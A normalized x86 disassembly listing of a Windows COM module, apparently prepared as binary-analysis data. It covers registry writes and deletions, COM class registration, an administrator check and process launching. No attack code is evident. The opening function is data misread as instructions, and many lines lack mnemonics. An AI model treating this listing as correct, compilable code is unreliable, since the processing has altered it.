sub_30001832
rcl [ ecx ] 0x1
mov cl bh
add [ eax - 0x408e2839 ] al
mov [ 0x224e14fb ] al
rcl [ cs : ecx ] 0x1
cdq
add al al
dec edi
mov ebx 0xe1545b3
imul ecx [ edx + 0x38 ] 0x2e
rcl [ ecx ] 0x1
cdq
add al al
dec edi
mov ebx 0xfb9f45b3
adc al 0x4e
and ch [ esi ]
rcl [ ecx ] 0x1
cdq
add al al
dec edi
mov ebx 0x45b3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax [ esp + 0x4 ]
add eax 0x4
push eax
call [ InterlockedIncrement@IAT ]
retn 0x4
sub_300018b1
mov eax [ esp + 0xc ]
push ebx
push esi
mov esi [ esp + 0x10 ]
push edi
xor ebx ebx
push 0x4
pop ecx
mov edi r-xdata
xor edx edx
mov [ eax ] ebx
[ esi ] [ edi ]
je r-xdata
mov ecx [ esp + 0x10 ]
mov [ eax ] ecx
mov esi [ esp + 0x14 ]
push 0x4
pop ecx
mov edi r-xdata
xor edx edx
[ esi ] [ edi ]
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn 0xc
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov ebx 0x80004002
jmp r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
sub_30001901
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
lea esi [ edi + 0x4 ]
push esi
call [ InterlockedDecrement@IAT ]
cmp [ esi ] 0x0
mov ebx eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x4
call sub_3000188d
push edi
mov [ edi ] r-xdata
call sub_300048ab
pop ecx
sub_30001933
push ecx
push ebx
mov ebx [ esp + 0x18 ]
and [ ebx ] 0x0
push ebp
mov ebp [ esp + 0x18 ]
push esi
push edi
push 0x4
pop ecx
mov edi r-xdata
mov esi ebp
xor eax eax
[ esi ] [ edi ]
mov [ esp + 0x10 ] 0x8007000e
je r-xdata
push 0xc
call sub_300048f7
test eax eax
pop ecx
je r-xdata
push 0x4
pop ecx
mov edi r-xdata
mov esi ebp
xor eax eax
[ esi ] [ edi ]
je r-xdata
xor eax eax
push sub_3000188d
mov ecx eax
call sub_30001b67
jmp r-xdata
mov [ esp + 0x10 ] 0x80004002
jmp r-xdata
cmp [ ebx ] 0x0
pop edi
pop esi
pop ebp
pop ebx
je r-xdata
mov ecx [ eax ]
push ebx
push ebp
push eax
call [ ecx ]
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
mov eax [ esp ]
pop ecx
retn 0x10
push rw-data
call [ InterlockedIncrement@IAT ]
sub_30001a09
push esi
mov esi [ esp + 0x14 ]
and [ esi ] 0x0
cmp [ esp + 0xc ] 0x0
je r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
mov eax [ rw-data ]
mov [ esi ] eax
xor eax eax
mov eax 0x8002000b
jmp r-xdata
pop esi
retn 0x10
sub_30001a37
push esi
mov esi [ esp + 0xc ]
push edi
push 0x4
pop ecx
mov edi r-xdata
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
push [ esp + 0x18 ]
mov eax [ rw-data ]
push [ esp + 0x14 ]
mov ecx [ eax ]
push [ esp + 0x14 ]
push eax
call [ ecx + 0x28 ]
mov eax 0x80020001
jmp r-xdata
retn 0x18
sub_30001a6e
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
push edi
push 0x4
pop ecx
mov edi r-xdata
xor eax eax
[ esi ] [ edi ]
pop edi
pop esi
je r-xdata
push [ ebp + 0x28 ]
mov eax [ rw-data ]
push [ ebp + 0x24 ]
mov ecx [ eax ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ ecx + 0x2c ]
mov eax 0x80020001
jmp r-xdata
pop ebp
retn 0x24
sub_30001ad0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
xor ebx ebx
push 0x4
pop ecx
mov edi r-xdata
xor edx edx
mov [ eax ] ebx
[ esi ] [ edi ]
jne r-xdata
mov esi [ ebp + 0xc ]
push 0x4
pop ecx
mov edi r-xdata
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
jmp r-xdata
mov esi [ ebp + 0xc ]
push 0x4
pop ecx
mov edi r-xdata
xor edx edx
[ esi ] [ edi ]
je r-xdata
mov eax [ eax ]
test eax eax
je r-xdata
mov ebx 0x80004002
pop edi
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0xc
mov ecx [ eax ]
push eax
call [ ecx + 0x4 ]
sub_30001b31
push ebx
push esi
push edi
mov edi [ esp + 0x10 ]
lea esi [ edi + 0x4 ]
push esi
call [ InterlockedDecrement@IAT ]
cmp [ esi ] 0x0
mov ebx eax
jne r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
retn 0x4
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push edi
mov [ edi ] r-xdata
call sub_300048ab
pop ecx
call eax
sub_30001b7d
push ebp
mov ebp esp
push ecx
push edi
xor edi edi
push edi
lea eax [ ebp - 0x4 ]
push eax
push edi
push 0x20006
push edi
push edi
push edi
push [ ebp + 0xc ]
mov [ ebp - 0x4 ] edi
push [ ebp + 0x8 ]
call [ RegCreateKeyExW@IAT ]
cmp eax edi
je r-xdata
cmp [ ebp + 0x10 ] edi
push esi
je r-xdata
jle r-xdata
mov eax [ ebp + 0x14 ]
cmp eax edi
jne r-xdata
push [ ebp + 0x10 ]
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push [ ebp + 0x10 ]
push 0x1
push edi
push edi
push [ ebp - 0x4 ]
call [ RegSetValueExW@IAT ]
mov esi eax
cmp esi edi
je r-xdata
pop edi
leave
retn 0x10
and eax 0xffff
or eax 0x80070000
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
jmp r-xdata
push [ ebp - 0x4 ]
call [ RegCloseKey@IAT ]
cmp esi edi
jle r-xdata
xor eax eax
mov eax esi
jmp r-xdata
and esi 0xffff
or esi 0x80070000
pop esi
sub_30001c19
push esi
push [ esp + 0x10 ]
xor esi esi
call [ lstrlenW@IAT ]
lea eax [ eax + eax + 0x2 ]
push eax
push [ esp + 0x14 ]
push 0x1
push esi
push [ esp + 0x1c ]
push [ esp + 0x1c ]
call [ RegSetValueExW@IAT ]
cmp eax esi
je r-xdata
mov eax esi
pop esi
retn 0xc
jle r-xdata
mov esi eax
and eax 0xffff
or eax 0x80070000
sub_30001c58
push ebp
lea ebp [ esp - 0x1a0 ]
sub esp 0x220
mov eax [ rw-data ]
push esi
mov [ ebp + 0x19c ] eax
lea eax [ ebp - 0x74 ]
push eax
push 0x2000e
xor esi esi
push esi
push [ ebp + 0x1ac ]
push [ ebp + 0x1a8 ]
call [ RegOpenKeyExW@IAT ]
cmp eax esi
je r-xdata
push ebx
mov ebx [ RegEnumKeyExW@IAT ]
push edi
jmp r-xdata
jle r-xdata
lea eax [ ebp - 0x80 ]
push eax
push esi
push esi
push esi
lea eax [ ebp - 0x78 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
push esi
push [ ebp - 0x74 ]
mov [ ebp - 0x78 ] 0x105
call ebx
test eax eax
je r-xdata
mov ecx [ ebp + 0x19c ]
pop esi
call sub_3000607d
add ebp 0x1a0
leave
retn 0x8
and eax 0xffff
or eax 0x80070000
jmp r-xdata
lea eax [ ebp - 0x70 ]
push eax
push [ ebp - 0x74 ]
call sub_30001c58
mov edi eax
cmp edi esi
jne r-xdata
push [ ebp - 0x74 ]
call [ RegCloseKey@IAT ]
push [ ebp + 0x1ac ]
push [ ebp + 0x1a8 ]
call [ RegDeleteKeyW@IAT ]
cmp eax esi
jle r-xdata
push [ ebp - 0x74 ]
call [ RegCloseKey@IAT ]
cmp edi esi
jle r-xdata
pop edi
pop ebx
and eax 0xffff
or eax 0x80070000
jmp r-xdata
mov eax edi
and edi 0xffff
or edi 0x80070000
sub_30001d43
push esi
push edi
xor edi edi
push edi
push edi
call [ CoInitializeEx@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
pop edi
mov eax esi
pop esi
retn 0x4
mov esi rw-data
push esi
push edi
push edi
push 0x1
push r-xdata
call [ LoadRegTypeLib@IAT ]
test eax eax
jge r-xdata
mov eax [ rw-data ]
mov ecx [ eax ]
push rw-data
push r-xdata
push eax
call [ ecx + 0x18 ]
mov esi eax
cmp esi edi
jl r-xdata
push esi
push r-xdata
call [ LoadTypeLib@IAT ]
mov esi eax
cmp esi edi
jl r-xdata
push edi
push edi
push edi
push edi
call [ CreateEventW@IAT ]
cmp eax edi
mov [ rw-data ] eax
je r-xdata
push 0x8
call sub_300048f7
cmp eax edi
pop ecx
je r-xdata
xor eax eax
mov ecx eax
call sub_300019ea
jmp r-xdata
push [ esp + 0xc ]
push 0x1
push 0x4
push eax
push r-xdata
call [ CoRegisterClassObject@IAT ]
mov esi eax
cmp eax edi
mov [ rw-data ] eax
je r-xdata
sub_30001def
push esi
xor esi esi
cmp [ esp + 0x8 ] esi
je r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push [ esp + 0x8 ]
call [ CoRevokeClassObject@IAT ]
mov esi eax
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
call [ CoUninitialize@IAT ]
mov eax esi
pop esi
retn 0x4
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
sub_30001e3d
push ebp
mov ebp esp
push ecx
lea eax [ ebp - 0x4 ]
push eax
push r-xdata
push r-xdata
push 0x80000001
call sub_30002211
test eax eax
jne r-xdata
xor eax eax
cmp [ ebp - 0x4 ] eax
setne al
leave
retn
leave
retn
sub_30001e69
push ebp
lea ebp [ esp - 0x6c ]
sub esp 0x6e8
mov eax [ rw-data ]
push ebx
push esi
push edi
xor ebx ebx
mov esi [ StringFromCLSID@IAT ]
mov [ ebp + 0x68 ] eax
xor eax eax
mov [ ebp - 0x258 ] bx
mov ecx 0x81
lea edi [ ebp - 0x256 ]
[ edi ]
stosw [ edi ]
xor eax eax
mov [ ebp - 0x668 ] bx
mov ecx 0x103
lea edi [ ebp - 0x666 ]
[ edi ]
stosw [ edi ]
lea eax [ ebp - 0x670 ]
push eax
push [ ebp + 0x74 ]
mov [ ebp - 0x67c ] ebx
mov [ ebp - 0x66c ] ebx
mov [ ebp - 0x674 ] ebx
mov [ ebp - 0x670 ] ebx
mov [ ebp - 0x678 ] ebx
call esi
mov edi eax
cmp edi ebx
jl r-xdata
push [ ebp - 0x670 ]
mov esi [ CoTaskMemFree@IAT ]
call esi
push [ ebp - 0x678 ]
call esi
mov ecx [ ebp + 0x68 ]
mov eax edi
pop edi
pop esi
pop ebx
call sub_3000607d
add ebp 0x6c
leave
retn 0xc
cmp [ ebp + 0x7c ] ebx
mov ebx [ wnsprintfW@IAT ]
jne r-xdata
push [ ebp - 0x670 ]
lea eax [ ebp + 0xc ]
push r-xdata
push 0x2d
push eax
call ebx
push [ ebp - 0x670 ]
lea eax [ ebp - 0x50 ]
push r-xdata
push 0x2d
push eax
call ebx
add esp 0x20
cmp [ ebp + 0x7c ] 0x0
mov ebx 0x80000000
je r-xdata
lea eax [ ebp - 0x678 ]
push eax
push r-xdata
call esi
mov edi eax
test edi edi
jl r-xdata
lea eax [ ebp - 0x66c ]
push eax
push [ ebp + 0x78 ]
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_30001b7d
mov edi eax
test edi edi
jl r-xdata
lea eax [ ebp + 0xc ]
push eax
push ebx
call sub_30001c58
mov edi eax
test edi edi
jl r-xdata
push 0x104
lea eax [ ebp - 0x258 ]
push eax
push 0x0
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
push [ ebp - 0x670 ]
push r-xdata
push [ ebp - 0x66c ]
call sub_30001c19
mov edi eax
test edi edi
jl r-xdata
lea eax [ ebp - 0x50 ]
push eax
push ebx
call sub_30001c58
mov edi eax
jmp r-xdata
push 0x73
lea eax [ ebp - 0x258 ]
push eax
push r-xdata
lea eax [ ebp - 0x668 ]
push 0x208
push eax
call ebx
add esp 0x14
mov edi 0x80070002
jmp r-xdata
lea eax [ ebp - 0x674 ]
push eax
lea eax [ ebp - 0x668 ]
push eax
push r-xdata
push [ ebp - 0x66c ]
call sub_30001b7d
mov edi eax
test edi edi
jl r-xdata
push [ ebp - 0x674 ]
mov esi [ RegCloseKey@IAT ]
call esi
lea eax [ ebp - 0x674 ]
push eax
push [ ebp - 0x678 ]
push r-xdata
push [ ebp - 0x66c ]
call sub_30001b7d
mov edi eax
test edi edi
jl r-xdata
push [ ebp - 0x674 ]
call esi
push [ ebp - 0x66c ]
call esi
lea eax [ ebp - 0x67c ]
push eax
push [ ebp + 0x78 ]
lea eax [ ebp - 0x50 ]
push eax
push ebx
call sub_30001b7d
mov edi eax
test edi edi
jl r-xdata
push r-xdata
push r-xdata
push [ ebp - 0x67c ]
call sub_30001c19
mov edi eax
test edi edi
jl r-xdata
push [ ebp - 0x67c ]
call esi
sub_300020b2
push 0x0
push 0x0
call [ CoInitializeEx@IAT ]
test eax eax
jl r-xdata
retn 0x4
push [ esp + 0x4 ]
push r-xdata
push r-xdata
call sub_30001e69
test eax eax
jl r-xdata
call [ CoUninitialize@IAT ]
xor eax eax
cmp [ esp + 0x4 ] eax
push 0x0
sete al
push eax
call sub_30002b15
sub_300020f1
push ebp
mov ebp esp
push ecx
push esi
push edi
or esi 0xffffffff
call sub_30001e3d
test eax eax
je r-xdata
xor edi edi
push edi
call sub_30004923
test eax eax
je r-xdata
int3
pop edi
mov eax esi
pop esi
leave
retn
call sub_30004989
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
cmp edx 0x2
mov ecx [ ebp + 0xc ]
jl r-xdata
cmp edx 0x3
jg r-xdata
mov eax [ ecx + 0x4 ]
mov ax [ eax ]
cmp ax 0x2d
je r-xdata
call sub_30004962
cmp edx 0x2
jl r-xdata
cmp ax 0x2f
jne r-xdata
mov eax [ ecx + 0x4 ]
movzx eax [ eax + 0x2 ]
sub eax 0x61
je r-xdata
push edi
push 0x1
sub eax 0x5
je r-xdata
cmp edx 0x3
jne r-xdata
sub eax 0x3
je r-xdata
xor eax eax
push [ ecx + 0x8 ]
call _wtol
pop ecx
jmp r-xdata
push edi
sub eax 0xa
je r-xdata
call sub_300035d9
push eax
push edi
push edi
jmp r-xdata
xor esi esi
lea eax [ ebp - 0x4 ]
push eax
call sub_30001d43
test eax eax
jl r-xdata
dec eax
je r-xdata
push [ ebp - 0x4 ]
call sub_30001def
jmp r-xdata
push esi
push [ rw-data ]
call [ WaitForSingleObject@IAT ]
push edi
push edi
jmp r-xdata
dec eax
jne r-xdata
push 0x1
push 0x1
jmp r-xdata
call sub_300020b2
jmp r-xdata
sub_30002211
push ebp
mov ebp esp
push ecx
push esi
lea eax [ ebp + 0xc ]
push eax
push 0x20019
push 0x0
push [ ebp + 0xc ]
xor esi esi
push [ ebp + 0x8 ]
inc esi
mov [ ebp - 0x4 ] 0x4
call [ RegOpenKeyExA@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x14 ]
push 0x0
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ RegQueryValueExA@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
push [ ebp + 0xc ]
call [ RegCloseKey@IAT ]
mov eax esi
xor esi esi
pop esi
leave
retn 0x10
sub_30002283
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
and [ ebp - 0x20c ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
mov ecx 0x81
lea edi [ ebp - 0x20a ]
[ edi ]
stosw [ edi ]
mov esi 0x104
push esi
lea eax [ ebp - 0x20c ]
push eax
push [ ebp + 0x8 ]
call sub_30004b53
push esi
lea eax [ ebp - 0x20c ]
push eax
push [ ebp + 0xc ]
call sub_30004b95
push esi
lea eax [ ebp - 0x20c ]
push eax
push r-xdata
call sub_30004b95
push esi
lea eax [ ebp - 0x20c ]
push eax
push r-xdata
call sub_30004b95
lea eax [ ebp - 0x20c ]
push eax
call sub_3000226c
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
call sub_3000607d
leave
retn 0x8
sub_30002312
push ebp
mov ebp esp
sub esp 0x20c
mov eax [ rw-data ]
push esi
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
mov [ ebp - 0x4 ] eax
mov esi 0x104
lea eax [ ebp - 0x20c ]
je r-xdata
push 0x1
push 0x1c
push eax
push edi
call [ SHGetSpecialFolderPathW@IAT ]
test eax eax
jne r-xdata
push esi
push eax
call [ GetSystemWindowsDirectoryW@IAT ]
cmp eax edi
je r-xdata
push esi
lea eax [ ebp - 0x20c ]
push eax
push r-xdata
call sub_30004b95
cmp [ ebp + 0x8 ] edi
jne r-xdata
xor eax eax
jmp r-xdata
call [ GetLastError@IAT ]
jmp r-xdata
cmp eax esi
jbe r-xdata
push r-xdata
lea eax [ ebp - 0x20c ]
push eax
call sub_30002283
test eax eax
je r-xdata
push r-xdata
lea eax [ ebp - 0x20c ]
push eax
call sub_30002283
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
call sub_3000607d
leave
retn 0x4
push r-xdata
lea eax [ ebp - 0x20c ]
push eax
call sub_30002283
test eax eax
je r-xdata
or edi 0x2
xor edi edi
inc edi
mov eax edi
or edi 0x4
sub_300023d2
push ebp
mov ebp esp
lea eax [ ebp + 0x8 ]
push eax
push r-xdata
push r-xdata
push [ ebp + 0x8 ]
call sub_30002211
neg eax
sbb eax eax
and eax [ ebp + 0x8 ]
pop ebp
retn 0x4
sub_300023f6
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
push ebx
xor ebx ebx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea eax [ ebp - 0xc ]
push eax
mov [ ebp - 0xc ] bl
mov [ ebp - 0xb ] bl
mov [ ebp - 0xa ] bl
mov [ ebp - 0x9 ] bl
mov [ ebp - 0x8 ] bl
mov [ ebp - 0x7 ] 0x5
call [ AllocateAndInitializeSid@IAT ]
cmp eax ebx
mov [ ebp - 0x10 ] eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x10 ]
pop ebx
call sub_3000607d
leave
retn
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x14 ]
push ebx
call CheckTokenMembership
test eax eax
jne r-xdata
push [ ebp - 0x14 ]
call [ FreeSid@IAT ]
mov [ ebp - 0x10 ] ebx
sub_30002469
push esi
xor esi esi
cmp [ esp + 0x8 ] esi
push edi
jne r-xdata
push 0x0
call sub_30002312
push 0x80000001
call sub_300023d2
jmp r-xdata
call sub_300023f6
test eax eax
je r-xdata
mov [ eax ] edi
mov edi eax
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax esi
or eax edi
pop edi
pop esi
retn 0xc
mov [ eax ] esi
push 0x1
call sub_30002312
push 0x80000002
call sub_300023d2
jmp r-xdata
mov esi eax
sub_300024ca
push ebp
mov ebp esp
sub esp 0x414
mov eax [ rw-data ]
and [ ebp - 0x414 ] 0x0
and [ ebp - 0x20c ] 0x0
push esi
push edi
mov [ ebp - 0x4 ] eax
mov edx 0x81
xor eax eax
mov ecx edx
lea edi [ ebp - 0x412 ]
[ edi ]
stosw [ edi ]
xor eax eax
mov ecx edx
lea edi [ ebp - 0x20a ]
[ edi ]
stosw [ edi ]
mov edi [ GetShortPathNameW@IAT ]
mov esi 0x104
push esi
lea eax [ ebp - 0x414 ]
push eax
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
mov edi [ GetLongPathNameW@IAT ]
push esi
lea eax [ ebp - 0x414 ]
push eax
push [ ebp + 0x8 ]
call edi
test eax eax
je r-xdata
push esi
lea eax [ ebp - 0x20c ]
push eax
push [ ebp + 0xc ]
call edi
test eax eax
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x20c ]
push eax
push [ ebp + 0xc ]
call edi
test eax eax
je r-xdata
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x414 ]
push eax
jmp r-xdata
call [ lstrcmpiW@IAT ]
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
pop edi
inc eax
pop esi
call sub_3000607d
leave
retn 0x8
sub_300025ac
push ebp
mov ebp esp
push ecx
push ecx
and [ ebp - 0x8 ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x2011
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x8 ]
push eax
call sub_30004dff
test eax eax
je r-xdata
call [ GetLastError@IAT ]
xor eax eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
inc eax
jmp r-xdata
leave
retn 0x4
sub_300025eb
push ebp
lea ebp [ esp - 0x3e8 ]
sub esp 0x468
mov eax [ rw-data ]
push esi
push edi
mov [ ebp + 0x3e4 ] eax
push 0x10
xor eax eax
pop ecx
push [ ebp + 0x3f0 ]
mov [ ebp - 0x80 ] 0x44
lea edi [ ebp - 0x7c ]
[ edi ]
xor esi esi
mov [ ebp - 0x3c ] esi
lea edi [ ebp - 0x38 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
call sub_30004a45
cmp eax 0x104
jg r-xdata
mov ecx [ ebp + 0x3e4 ]
pop edi
pop esi
call sub_3000607d
add ebp 0x3e8
leave
retn 0x8
push [ ebp + 0x3f4 ]
lea eax [ ebp - 0x2c ]
push 0x6b
push [ ebp + 0x3f0 ]
push r-xdata
push 0x208
push eax
call [ wnsprintfW@IAT ]
add esp 0x18
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x80 ]
push eax
push esi
push esi
push 0x4000020
push esi
push esi
push esi
lea eax [ ebp - 0x2c ]
push eax
push esi
call [ CreateProcessW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x3c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x38 ]
call esi
sub_300026a1
push ebp
lea ebp [ esp - 0x390 ]
sub esp 0x410
mov eax [ rw-data ]
push ebx
push esi
push edi
mov edi [ CoCreateInstance@IAT ]
mov [ ebp + 0x38c ] eax
lea eax [ ebp - 0x7c ]
push eax
push r-xdata
xor ebx ebx
push 0x15
push ebx
push r-xdata
mov [ ebp - 0x7c ] ebx
mov [ ebp - 0x78 ] ebx
call edi
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x7c ]
test eax eax
je r-xdata
cmp [ ebp + 0x39c ] ebx
jne r-xdata
mov eax [ ebp - 0x78 ]
test eax eax
je r-xdata
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
lea eax [ ebp - 0x78 ]
push eax
push r-xdata
push 0x15
push ebx
push r-xdata
call edi
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp + 0x398 ]
push [ eax ]
lea eax [ ebp - 0x74 ]
push r-xdata
push 0x200
push eax
call [ wnsprintfW@IAT ]
mov esi [ SysAllocString@IAT ]
add esp 0x10
push r-xdata
call esi
mov edi eax
cmp edi ebx
jne r-xdata
mov ecx [ ebp + 0x38c ]
pop edi
mov eax esi
pop esi
pop ebx
call sub_3000607d
add ebp 0x390
leave
retn 0x8
mov ecx [ eax ]
push eax
call [ ecx + 0x8 ]
mov edi [ ebp + 0x398 ]
mov eax [ ebp - 0x78 ]
push [ edi ]
mov ecx [ eax ]
push eax
call [ ecx + 0x20 ]
mov esi eax
cmp esi ebx
jl r-xdata
lea eax [ ebp - 0x74 ]
push eax
call esi
mov ebx eax
test ebx ebx
je r-xdata
mov esi 0x8007000e
jmp r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0x14 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x48 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
lea edx [ ebp - 0x80 ]
push edx
push ebx
push edi
push eax
call [ ecx + 0x24 ]
push edi
mov edi [ SysFreeString@IAT ]
mov esi eax
call edi
push ebx
call edi
jmp r-xdata
mov ecx [ edi + 0x8 ]
cmp ecx ebx
je r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x30 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov ecx [ edi + 0x10 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x28 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0xc ]
mov ecx [ eax ]
push eax
call [ ecx + 0x38 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x40 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0x30 ]
mov ecx [ eax ]
push eax
call [ ecx + 0xa0 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov ecx [ edi + 0x28 ]
cmp ecx ebx
je r-xdata
mov ecx [ edi + 0x20 ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x70 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov ecx [ edi + 0x2c ]
cmp ecx ebx
je r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x60 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0x24 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x68 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
mov edx [ eax ]
push ecx
push eax
call [ edx + 0x78 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0x1c ]
mov ecx [ eax ]
push eax
call [ ecx + 0x58 ]
mov esi eax
cmp esi ebx
jl r-xdata
mov eax [ ebp - 0x78 ]
push [ edi + 0x18 ]
mov ecx [ eax ]
push eax
call [ ecx + 0x50 ]
mov esi eax
cmp esi ebx
jl r-xdata
push r-xdata
call [ SysAllocString@IAT ]
mov edi eax
cmp edi ebx
je r-xdata
push [ ebp - 0x78 ]
mov eax [ ebp - 0x7c ]
mov ecx [ eax ]
push edi
push eax
call [ ecx + 0x20 ]
push edi
mov esi eax
call [ SysFreeString@IAT ]
sub_30002906
push esi
mov esi [ SysFreeString@IAT ]
push edi
mov edi [ esp + 0xc ]
mov eax [ edi + 0x28 ]
test eax eax
je r-xdata
mov eax [ edi + 0xc ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x30 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x2c ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x10 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x20 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x14 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
push 0xd
pop ecx
xor eax eax
[ edi ]
pop edi
pop esi
retn 0x4
push eax
call esi
sub_30002981
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0xd
pop ecx
xor eax eax
mov edi ebx
[ edi ]
lea eax [ ebp - 0x4 ]
push eax
push [ esi ]
call [ StringFromIID@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
push ebx
call sub_30002906
push [ ebp - 0x4 ]
mov edi [ SysAllocString@IAT ]
call edi
test eax eax
mov [ ebx ] eax
je r-xdata
mov [ ebp + 0x8 ] 0x8007000e
jmp r-xdata
push [ esi + 0x4 ]
call edi
test eax eax
mov [ ebx + 0x4 ] eax
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
push [ esi + 0xc ]
call [ StringFromIID@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
push eax
push [ esi + 0x8 ]
call [ StringFromIID@IAT ]
test eax eax
mov [ ebp + 0x8 ] eax
jl r-xdata
push [ ebp - 0x4 ]
call [ CoTaskMemFree@IAT ]
and [ ebp - 0x4 ] 0x0
push [ ebp - 0x4 ]
call edi
test eax eax
mov [ ebx + 0xc ] eax
